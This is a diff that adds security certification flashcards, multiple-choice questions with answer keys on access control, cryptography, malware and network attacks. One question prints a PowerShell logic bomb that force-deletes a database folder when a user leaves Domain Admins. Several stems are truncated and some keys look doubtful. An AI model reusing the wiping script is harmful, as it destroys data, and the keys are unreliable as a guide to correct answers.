+      "front": "A systems administrator is configuring a system that uses data classification labels. Which of the following will the administrator need to implement to enforce access control?\nA. Discretionary access control\nB. Mandatory access control\nC. Role-based access control\nD. Rule-based access control",
+      "back": "B. Mandatory access control"
+    },
+    {
+      "front": "An analyst is using a vulnerability scanner to look for common security misconfigurations on devices. Which of the following might be identified by the scanner? (Select TWO).\nA. The firewall is disabled on workstations.\nB. SSH is enabled on servers.\nC. Browser homepages have not been customized.\nD. Default administrator credentials exist on networking hardware.\nE. The OS is only set to check for updates once a day.",
+      "back": "A. The firewall is disabled on workstations.\nD. Default administrator credentials exist on networking hardware."
+    },
+    {
+      "front": "A security analyst is reviewing patches on servers. One of the servers is reporting the following error message in the WSUS management console: The computer has not reported status in 30 days. Given this scenario, which of the following statements BEST represents the issue with the output above?\nA. The computer in question has not pulled the latest ACL policies for the firewall.\nB. The computer in question has not pulled the latest GPO policies from the management server.\nC. The computer in question has not pulled the latest antivirus definitions from the antivirus program.\nD. The computer in question has not pulled the latest application software updates.",
+      "back": "D. The computer in question has not pulled the latest application software updates."
+    },
+    {
+      "front": "Two users must encrypt and transmit large amount of data between them. Which of the following should they use to encrypt and transmit the data?\nA. Symmetric algorithm\nB. Hash function\nC. Digital signature\nD. Obfuscation",
+      "back": "A. Symmetric algorithm"
+    },
+    {
+      "front": "A security administrator is reviewing the following PowerShell script referenced in the Task Scheduler on a database server: $members = GetADGroupMemeber -Identity \"Domain Admins\" -Recursive | Select - ExpandProperty name if ($members -notcontains \"JohnDoe\"){ Remove-Item -path C:\\Database -recurse -force } Which of the following did the security administrator discover?\nA. Ransomeware\nB. Backdoor\nC. Logic bomb\nD. Trojan",
+      "back": "C. Logic bomb"
+    },
+    {
+      "front": "A bank is experiencing a DoS attack against an application designed to handle 500IP-based sessions. in addition, the perimeter router can only handle 1Gbps of traffic. Which of the following should be implemented to prevent a DoS attacks in the future?\nA. Deploy multiple web servers and implement a load balancer\nB. Increase the capacity of the perimeter router to 10 Gbps\nC. Install a firewall at the network to prevent all attacks\nD. Use redundancy across all network devices and services",
+      "back": "D. Use redundancy across all network devices and services"
+    },
+    {
+      "front": "A malicious system continuously sends an extremely large number of SYN packets to a server. Which of the following BEST describes the resulting effect?\nA. The server will be unable to server clients due to lack of bandwidth\nB. the server's firewall will be unable to effectively filter traffic due to the amount of data transmitted\nC. The server will crash when trying to reassemble all the fragmented packets\nD. The server will exhaust its memory maintaining half-open connections",
+      "back": "D. The server will exhaust its memory maintaining half-open connections"
+    },
+    {
+      "front": "A systems administrator is deploying a new mission essential server into a virtual environment. Which of the following is BEST mitigated by the environment's rapid elasticity characteristic?\nA. Data confidentiality breaches\nB. VM escape attacks\nC. Lack of redundancy\nD. Denial of service",
+      "back": "D. Denial of service"
+    },
+    {
+      "front": "Which of the following is the proper order for logging a user into a system from the first step to the last step?\nA. Identification, authentication, authorization\nB. Identification, authorization, authentication\nC. Authentication, identification, authorization\nD. Authentication, identification, authorization\nE. Authorization, identification, authentication",
+      "back": "A. Identification, authentication, authorization"
+    },
+    {
+      "front": "A company stores highly sensitive data files used by the accounting system on a server file share. The accounting system uses a service account named accounting-svc to access the file share. The data is protected will a full disk encryption, and the permissions are set as follows: File system permissions: Users = Read Only Share permission: accounting-svc = Read Only Given the listed protections are in place and unchanged, to which of the following risks is the data still subject?\nA. Exploitation of local console access and removal of data\nB. Theft of physical hard drives and a breach of confidentiality\nC. Remote exfiltration of data using domain credentials\nD. Disclosure of sensitive data to third parties due to excessive share permissions",
+      "back": "A. Exploitation of local console access and removal of data"
+    },
+    {
+      "front": "A bank uses a wireless network to transmit credit card purchases to a billing system. Which of the following would be MOST appropriate to protect credit card information from being accessed by unauthorized individuals outside of the premises?\nA. Air gap\nB. Infrared detection\nC. Faraday cage\nD. Protected distributions",
+      "back": "C. Faraday cage"
+    },
+    {
+      "front": "Joe, a salesman, was assigned to a new project that requires him to travel to a client site. While waiting for a flight, Joe decides to connect to the airport wireless network without connecting to a VPN, and then sends confidential emails to fellow colleagues. A few days later, the company experiences a data breach. Upon investigation, the company learns Joe's emails were intercepted. Which of the following MOST likely caused the data breach?\nA. Policy violation\nB. Social engineering\nC. Insider threat\nD. Zero--day attack",
+      "back": "A. Policy violation"
+    },
+    {
+      "front": "A help desk technician receives a phone call from an individual claiming to be an employee of the organization and requesting assistance to access a locked account. The help desk technician asks the individual to provide proof of identity before access can be granted. Which of the following types of attack is the caller performing?\nA. Phishing\nB. Shoulder surfing\nC. Impersonation\nD. Dumpster diving",
+      "back": "C. Impersonation"
+    },
+    {
+      "front": "Confidential emails from an organization were posted to a website without the organization's knowledge. Upon investigation, it was determined that the emails were obtained from an internal actor who sniffed the emails in plain text. Which of the following protocols, if properly implemented, would have MOST likely prevented the emails from being sniffed? (Select TWO)\nA. Secure IMAP\nB. DNSSEC\nC. S/MIME\nD. SMTPS\nE. HTTPS",
+      "back": "C. S/MIME\nD. SMTPS\n\nSMTPS (Simple Mail Transfer Protocol Secure) is a deprecated method for securing SMTP with transport layer security. It is intended to provide authentication of the communication partners, as well as data integrity and confidentiality."
+    },
+    {
+      "front": "A company wants to implement an access management solution that allows employees to use the same usernames and passwords for multiple applications without having to keep multiple credentials synchronized. Which of the following solutions would BEST meet these requirements?\nA. Multifactor authentication\nB. SSO\nC. Biometrics\nD. PKI\nE. Federation",
+      "back": "B. SSO\nE. Federation"
+    },
+    {
+      "front": "An external auditor visits the human resources department and performs a physical security assessment. The auditor observed documents on printers that are unclaimed. A closer look at these documents reveals employee names, addresses, ages, and types of medical and dental coverage options each employee has selected. Which of the following is the MOST appropriate actions to take?\nA. Flip the documents face down so no one knows these documents are PII sensitive\nB. Shred the documents and let the owner print the new set\nC. Retrieve the documents, label them with a PII cover sheet, and return them to the printer\nD. Report to the human resources manager that their personnel are violating a privacy policy",
+      "back": "D. Report to the human resources manager that their personnel are violating a privacy policy"
+    },
+    {
+      "front": "Which of the following authentication concepts is a gait analysis MOST closely associated?\nA. Somewhere you are\nB. Something you are\nC. Something you do\nD. Something you know",
+      "back": "C. Something you do"
+    },
+    {
+      "front": "Which of the following metrics are used to calculate the SLE? (Select TWO)\nA. ROI\nB. ARO\nC. ALE\nD. MTBF\nE. MTTF\nF. TCO",
+      "back": "B. ARO\nC. ALE"
+    },
+    {
+      "front": "Due to regulatory requirements, server in a global organization must use time synchronization. Which of the following represents the MOST secure method of time synchronization?\nA. The server should connect to external Stratum 0 NTP servers for synchronization\nB. The server should connect to internal Stratum 0 NTP servers for synchronization\nC. The server should connect to external Stratum 1 NTP servers for synchronization\nD. The server should connect to external Stratum 1 NTP servers for synchronization",
+      "back": "B. The server should connect to internal Stratum 0 NTP servers for synchronization\n\nConfigure your own Internal NTP hierarchical service for your network. It is possible to purchase Stratum 1 or Stratum 0 NTP appliances to use internally for less than the cost of a typical server."
+    },
+    {
+      "front": "When sending messages using symmetric encryption, which of the following must happen FIRST?\nA. Exchange encryption key\nB. Establish digital signatures\nC. Agree on an encryption method\nD. Install digital certificates",
+      "back": "C. Agree on an encryption method"
+    },
+    {
+      "front": "Which of the following scenarios BEST describes an implementation of non-repudiation?\nA. A user logs into a domain workstation and access network file shares for another department\nB. A user remotely logs into the mail server with another user's credentials\nC. A user sends a digitally signed email to the entire finance department about an upcoming meeting\nD. A user access the workstation registry to make unauthorized changes to enable functionality within an application",
+      "back": "C. A user sends a digitally signed email to the entire finance department about an upcoming meeting"
+    },
+    {
+      "front": "An office manager found a folder that included documents with various types of data relating to corporate clients. The office manager notified the data included dates of birth, addresses, and phone numbers for the clients. The office manager then reported this finding to the security compliance officer. Which of the following portions of the policy would the security officer need to consult to determine if a breach has occurred?\nA. Public\nB. Private\nC. PHI\nD. PII",
+      "back": "D. PII"
+    },
+    {
+      "front": "Which of the following is an asymmetric function that generates a new and separate key every time it runs?\nA. RSA\nB. DSA\nC. DHE\nD. HMAC\nE. PBKDF2",
+      "back": "C. DHE\n\nAlthough Diffie-Hellman key agreement itself is a non-authenticated key-agreement protocol, it provides the basis for a variety of authenticated protocols, and is used to provide forward secrecy in Transport Layer Security's ephemeral modes (referred to as EDH..."
+    },
+    {
+      "front": "Which of the following would be considered multifactor authentication?\nA. Hardware token and smart card\nB. Voice recognition and retina scan\nC. Strong password and fingerprint\nD. PIN and security questions",
+      "back": "C. Strong password and fingerprint"
+    },
+    {
+      "front": "Users report the following message appear when browsing to the company's secure site: This website cannot be trusted. Which of the following actions should a security analyst take to resolve these messages? (Select TWO)\nA. Verify the certificate has not expired on the server\nB. Ensure the certificate has a .pfx extension on the server\nC. Update the root certificate into the client computer certificate store\nD. Install the updated private key on the web server\nE. Have users clear their browsing history and relaunch the session",
+      "back": "A. Verify the certificate has not expired on the server\nC. Update the root certificate into the client computer certificate store"
+    },
+    {
+      "front": "Despite having implemented password policies, users continue to set the same weak passwords and reuse old passwords. Which of the following technical controls would help prevent these policy violations?\nA. Password expiration\nB. Password length\nC. Password complexity\nD. Password history\nE. Password lockout",
+      "back": "A. Password expiration\nD. Password history"
+    },
+    {
+      "front": "A security auditor is testing perimeter security in a building that is protected by badge readers. Which of the following types of attacks would MOST likely gain access?\nA. Phishing\nB. Man-in-the-middle\nC. Tailgating\nD. Watering hole\nE. Shoulder surfing",
+      "back": "C. Tailgating"
+    },
+    {
+      "front": "Which of the following encryption methods does PKI typically use to securely protect keys?\nA. Elliptic curve\nB. Digital signatures\nC. Asymmetric\nD. Obfuscation",
+      "back": "C. Asymmetric"
+    },
+    {
+      "front": "A department head at a university resigned on the first day of spring semester. It was subsequently determined that the department head deleted numerous files and directories from the server-based home directory while the campus was closed. Which of the following policies or procedures could have prevented this form occurring?\nA. Time-of-day restrictions\nB. Permissions auditing and review\nC. Offboarding\nD. Account expiration",
+      "back": "C. Offboarding"
+    },
+    {
+      "front": "An organization wants to upgrade its enterprise-wide desktop computer solution. The organization currently has 500 PCs active on the network. the Chief Information Security Officer (CISO) suggests that the organization employ desktop imaging technology for such a large scale upgrade. Which of the following is a security benefit of implementing an imaging solution?\nA. it allows for faster deployment\nB. it provides a consistent baseline\nC. It reduces the number of vulnerabilities\nD. It decreases the boot time",
+      "back": "B. it provides a consistent baseline"
+    },
+    {
+      "front": "A senior incident response manager receives a call about some external IPs communicating with internal computers during off hours. Which of the following types of malware is MOST likely causing this issue?\nA. Botnet\nB. Ransomware\nC. Polymorphic malware\nD. Armored virus",
+      "back": "A. Botnet"
+    },
+    {
+      "front": "An organization has implemented an IPSec VPN access for remote users. Which of the following IPSec modes would be the MOST secure for this organization to implement?\nA. Tunnel mode\nB. Transport mode\nC. AH-only mode\nD. ESP-only mode",
+      "back": "A. Tunnel mode\n\nIn both ESP and AH cases with IPSec Transport mode, the IP header is exposed. The IP header is not exposed in IPSec Tunnel mode."
+    },
+    {
+      "front": "A security engineer is configuring a wireless network with EAP-TLS. Which of the following activities is a requirement for this configuration?\nA. Setting up a TACACS+ server\nB. Configuring federation between authentication servers\nC. Enabling TOTP\nD. Deploying certificates to endpoint devices",
+      "back": "D. Deploying certificates to endpoint devices"
+    },
+    {
+      "front": "Several workstations on a network are found to be on OS versions that are vulnerable to a specific attack. Which of the following is considered to be a corrective action to combat this vulnerability?\nA. Install an antivirus definition patch\nB. Educate the workstation users\nC. Leverage server isolation\nD. Install a vendor-supplied patch\nE. Install an intrusion detection system",
+      "back": "D. Install a vendor-supplied patch"
+    },
+    {
+      "front": "A user suspects someone has been accessing a home network without permission by spoofing the MAC address of an authorized system. While attempting to determine if an unauthorized user is logging into the home network, the user reviews the wireless router, which shows the following table for systems that are currently on the home network: Hostname IP Address MAC MAC Filter DadPC 192.168.1.15 00:1D:1A:44:17:B5 On MomPC 192.168.1.15 21:13:D6:C5:42:A2 Off JuniorPC 192.168.2.16 42:A7:D1:25:11:52 On Unknown 192.168.1.18 10:B3:22:1A:FF:21 Off Which of the following should be the NEXT step to determine if there is an unauthorized user on the network?\nA. Apply MAC filtering and see if the router drops any of the systems\nB. Physically check each of the authorized systems to determine if they are logged onto the network\nC. Deny the \"unknown\" host because the hostname is not known and MAC filtering is not applied to this host\nD. Conduct a ping sweep of each of the authorized systems and see if an echo response is received",
+      "back": "B. Physically check each of the authorized systems to determine if they are logged onto the network\n\nDad's PC and Mom's PC have the same IP address. One of them is doing ARP spoofing."
+    },
+    {
+      "front": "The POODLE attack is an MITM exploit that affects:\nA. TLS1.0 with CBC mode cipher\nB. SSLv2.0 with CBC mode cipher\nC. SSLv3.0 with CBC mode cipher\nD. SSLv3.0 with ECB mode cipher",
+      "back": "C. SSLv3.0 with CBC mode cipher\n\nA flaw was found in the way SSL 3.0 handled padding bytes when decrypting messages encrypted using block ciphers in cipher block chaining (CBC) mode."
+    },
+    {
+      "front": "Security administrators attempted corrective action after a phishing attack. Users are still experiencing trouble logging in, as well as an increase in account lockouts. Users' email contacts are complaining of an increase in spam and social networking requests. Due to the large number of affected accounts, remediation must be accomplished quickly. Which of the following actions should be taken FIRST? (Select TWO)\nA. Disable the compromised accounts\nB. Update WAF rules to block social networks\nC. Remove the compromised accounts with all AD groups\nD. Change the compromised accounts' passwords\nE. Disable the open relay on the email server\nF. Enable sender policy framework",
+      "back": "E. Disable the open relay on the email server\nF. Enable sender policy framework\n\nSender Policy Framework (SPF) is a simple email-validation system designed to detect email spoofing by providing a mechanism to allow receiving mail exchangers to check that incoming mail from a domain comes from a host authorized by that domain's administrato..."
+    },
+    {
+      "front": "Ann, a security administrator, wants to ensure credentials are encrypted in transit when implementing a RADIUS server for SSO. Which of the following are needed given these requirements? (Select TWO)\nA. Public key\nB. Shared key\nC. Elliptic curve\nD. MD5\nE. Private key\nF. DES",
+      "back": "A. Public key\nE. Private key"
+    },
+    {
+      "front": "Which of the following allows an auditor to test proprietary-software compiled code for security flaws?\nA. Fuzzing\nB. Static review\nC. Code signing\nD. Regression testing",
+      "back": "A. Fuzzing"
+    },
+    {
+      "front": "Which of the following s the BEST reason to run an untested application is a sandbox?\nA. To allow the application to take full advantage of the host system's resources and storage\nB. To utilize the host systems antivirus and firewall applications instead of running it own protection\nC. To prevent the application from acquiring escalated privileges and accessing its host system\nD. To increase application processing speed so the host system can perform real-time logging",
+      "back": "C. To prevent the application from acquiring escalated privileges and accessing its host system"
+    },
+    {
+      "front": "A manager wants to distribute a report to several other managers within the company. Some of them reside in remote locations that are not connected to the domain but have a local server. Because there is sensitive data within the report and the size is beyond the limit of the email attachment size, emailing the report is not an option. Which of the following protocols should be implemented to distribute the report securely? (Select THREE)\nA. S/MIME\nB. SSH\nC. SNMPv3\nD. FTPS\nE. SRTP\nF. HTTPS\nG. LDAPS",
+      "back": "B. SSH\nD. FTPS\nF. HTTPS"
+    },
+    {
+      "front": "A company is performing an analysis of the corporate enterprise network with the intent of identifying what will cause losses in revenue, referrals, and/or reputation when out of commission. Which of the following is an element of a BIA that is being addressed?\nA. Mission-essential function\nB. Single point of failure\nC. backup and restoration plans\nD. Identification of critical systems",
+      "back": "D. Identification of critical systems\n\nThe BIA is composed of the following three steps: Determine mission/business processes and recovery criticality."
+    },
+    {
+      "front": "Ann, a user, states that her machine has been behaving erratically over the past week. She has experienced slowness and input lag and found text files that appear to contain pieces of her emails or online conversations with coworkers. The technician runs a standard virus scan but detects nothing. Which of the following types of malware has infected the machine?\nA. Ransomware\nB. Rootkit\nC. Backdoor\nD. Keylogger",
+      "back": "D. Keylogger"
+    },
+    {
+      "front": "A security analyst is attempting to identify vulnerabilities in a customer's web application without impacting the system or its data. Which of the following BEST describes the vulnerability scanning concept performed?\nA. Aggressive scan\nB. Passive scan\nC. Non-credentialed scan\nD. Compliance scan",
+      "back": "B. Passive scan\n\nPassive scanning is a method of vulnerability detection that relies on information gleaned from network data that is captured from a target computer without direct interaction."
+    },
+    {
+      "front": "A systems administrator wants to implement a wireless protocol that will allow the organization to authenticate mobile devices prior to providing the user with a captive portal login. Which of the following should the systems administrator configure?\nA. L2TP with MAC filtering\nB. EAP-TTLS\nC. WPA2-CCMP with PSK\nD. RADIUS federation",
+      "back": "D. RADIUS federation\n\nRADIUS generally includes 802.1X that pre-authenticates devices."
+    },
+    {
+      "front": "A user receives an email from ISP indicating malicious traffic coming from the user's home network is detected. The traffic appears to be Linux-based, and it is targeting a website that was recently featured on the news as being taken offline by an Internet attack. The only Linux device on the network is a home surveillance camera system. Which of the following BEST describes what is happening?\nA. The camera system is infected with a bot.\nB. The camera system is infected with a RAT.\nC. The camera system is infected with a Trojan.\nD. The camera system is infected with a backdoor.",
+      "back": "A. The camera system is infected with a bot."
+    },
+    {
+      "front": "While on a business trip, a user's mobile device goes missing. The user immediately contacts the organization's service desk to report the incident. Which of the following actions is the best response to protect the data stored on the user's mobile device.\nA. Encrypt all of the data on the device\nB. Remotely wipe the mobile device via the mobile device manager to ensure the data is not compromised.\nC. Report the device as lost or stolen to the authorities\nD. Call the help desk to change your password",
+      "back": "B. Remotely wipe the mobile device via the mobile device manager to ensure the data is not compromised."
+    },
+    {
+      "front": "A security analyst launches the Task Manager on a server with poor performance, and notices private bytes are being exhausted and the application pool is constantly recycling. Which of the following Best describes the cause of the negative impact to application availability?\nA. Integer Overflow\nB. Buffer Overflow\nC. Race Condition\nD. Memory Leaks",
+      "back": "D. Memory Leaks\n\nPrivate Bytes refer to the amount of memory that the process executable has asked for - not necessarily the amount it is actually using. They are \"private\" because they (usually) exclude memory-mapped files (i.e. shared DLLs)."
+    },
+    {
+      "front": "While trying to manage a firewall's ACL, a security administrator (User3) receives an \"Access Denied\" error. The manager reviews the following information. Security_admins: User1, User2 Firewall Access ACL Read: Security_admins ACL Write: Security_admins Reboot: Managers Audit: User3 Which of the following is preventing the administrator from\nA. Rule based access control\nB. Mandatory access control\nC. Discretionary access's control\nD. RBAC",
+      "back": "A. Rule based access control"
+    },
+    {
+      "front": "Which of the following are the differences between incremental and differential backups?\nA. Both backup types or almost identical except for the time that the backup is run\nB. Differential backup take less time to complete\nC. Incremental backups take less time than differential\nD. Incremental backup back up all of the data since the last differential\nE. Differential backups take more time to restore than incremental backups\nF. Differential backups only backup files since the last full backup",
+      "back": "C. Incremental backups take less time than differential\nF. Differential backups only backup files since the last full backup"
+    },
+    {
+      "front": "A security analyst has been dealing with a large number of malware infections on workstations with legacy operating systems. The infections are not being detected by the current AV suite. Further analysis shows that the signatures are up to date and the AV engines are functioning correctly. The company is unable to afford next-generation AV that prevents these attacks. Which of the following methods should the security analyst employ to prevent future outbreaks?\nA. Application Blacklisting\nB. Application Whitelisting\nC. Blockchain analysis\nD. Strong ACL's",
+      "back": "B. Application Whitelisting"
+    },
+    {
+      "front": "A network administrator is reviewing the following IDS logs: Based on the above information, which of the following types of malware is triggering the IDS?\nA. Trojan\nB. Bot\nC. Logic Bomb\nD. Worm",
+      "back": "D. Worm"
+    },
+    {
+      "front": "A security analyst is checking the bash command history on a Linux host that was involved in a data breach. The data breach stemmed from the Linux host running a series of commands against a web server on the internal network, which exploited a vulnerability in an unpatched Apache module. Given this scenario, which of the following commands might the analyst find in the bash command history for banner grabbing? (Select Three)\nA. Arp\nB. Tracert\nC. NMAP\nD. Net Cat (NC)\nE. Telnet\nF. Grep\nG. Nslookup\nH. Netstat",
+      "back": "C. NMAP\nD. Net Cat (NC)\nE. Telnet"
+    }
   ]
 }
